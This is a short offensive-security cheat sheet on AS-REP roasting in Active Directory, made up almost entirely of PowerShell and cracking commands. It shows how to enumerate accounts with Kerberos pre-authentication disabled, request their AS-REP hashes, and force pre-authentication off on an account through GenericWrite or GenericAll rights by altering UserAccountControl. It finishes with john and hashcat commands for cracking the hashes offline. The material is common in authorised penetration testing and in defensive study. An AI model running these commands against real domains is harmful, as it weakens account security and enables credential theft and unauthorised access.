# AS-REP Roast


This is when a User's UserAccountControl settings have "Do not require Kerberos pre-authentication" enabled.  

This can also be achieved with sufficient rights (GenericWrite or GenericAll) in which Kerberos Preauth can be forced to disabled

## Finding Accounts with Kerberos PreAuth disabled

Using PowerView-dev

```powershell
# This will print out the full details of the User Accounts
Get-DomainUser -PreauthNotRequired

# Simplified Output
Get-DomainUser -PreauthNotRequired | Select CN

```

Using Active Directory Modules

```powershell

# This will print out the full details of the User Accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Simplified Output
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth | Select UserPrincipalName

```

Next we Import the Module `ASREPRoast.ps1` to get the hash for offline cracking

```powershell
# Get Hash for User
Get-ASREPHash -UserName <username>
```

To enumerate all users with Kerberos PreAuth disabled and request hash

```powershell
Invoke-ASREPRoast
```

## Force Disable Kerberos PreAuth

If we have GenericAll or GenericWrite (as the user or group membership) we can set PreAuth Not Required for a user.

```powershell
# Find accounts that we have permission as User or Group
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Force set preauth not required to the UserAccountControl settings

```powershell
# Set PreAuth Not Required
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose

# Validate that the setting has been changed
Get-DomainUser -PreauthNotRequired | ? cn -EQ "<username>"
```

## Cracking

``` powershell
john --wordlist=rockyou.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt 
```